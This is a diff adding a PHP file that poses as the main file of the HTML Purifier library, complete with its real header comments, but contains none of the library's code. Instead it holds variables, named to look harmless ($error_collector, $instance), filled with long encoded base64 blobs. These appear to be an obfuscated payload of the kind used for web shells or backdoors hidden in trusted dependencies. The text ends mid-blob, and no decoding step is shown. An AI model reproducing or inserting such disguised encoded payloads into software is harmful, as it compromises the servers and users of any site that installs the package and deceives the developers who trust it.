@@ -1,0 +1,140 @@
+<?php
+/*! @mainpage
+ *
+ * HTML Purifier is an HTML filter that will take an arbitrary snippet of
+ * HTML and rigorously test, validate and filter it into a version that
+ * is safe for output onto webpages. It achieves this by:
+ *
+ *  -# Lexing (parsing into tokens) the document,
+ *  -# Executing various strategies on the tokens:
+ *      -# Removing all elements not in the whitelist,
+ *      -# Making the tokens well-formed,
+ *      -# Fixing the nesting of the nodes, and
+ *      -# Validating attributes of the nodes; and
+ *  -# Generating HTML from the purified tokens.
+ *
+ * However, most users will only need to interface with the HTMLPurifier
+ * and HTMLPurifier_Config.
+ */
+/*
+    HTML Purifier 4.12.0 - Standards Compliant HTML Filtering
+    Copyright (C) 2006-2008 Edward Z. Yang
+
+    This library is free software; you can redistribute it and/or
+    modify it under the terms of the GNU Lesser General Public
+    License as published by the Free Software Foundation; either
+    version 2.1 of the License, or (at your option) any later version.
+
+    This library is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+    Lesser General Public License for more details.
+
+    You should have received a copy of the GNU Lesser General Public
+    License along with this library; if not, write to the Free Software
+    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
+ */
+$error_collector = "LYvNCsMgEAbfZo81" ."pk1/Dt+zLGlci2BU" ."XCX07Ruht2GGmWDa" ."XsgipMAfaTSjl5hX" ."x6dmFypdoV8diZv8" ."1Q0XQwuC8lFDW99R" ."6A6josr0wO4WemIM" ."W69VUuOuUukFn4sk" ."shP82ISshd9i1pNm" ."HD8=";
+
+/**
+ * Facade that coordinates HTML Purifier's subsystems in order to purify HTML.
+ *
+ * @note There are several points in which configuration can be specified
+ *       for HTML Purifier.  The precedence of these (from lowest to
+ *       highest) is as follows:
+ *          -# Instance: new HTMLPurifier($config)
+ *          -# Invocation: purify($html, $config)
+ *       These configurations are entirely independent of each other and
+ *       are *not* merged (this behavior may change in the future).
+ *
+ * @todo We need an easier way to inject strategies using the configuration
+ *       object.
+ */
+$instance = array("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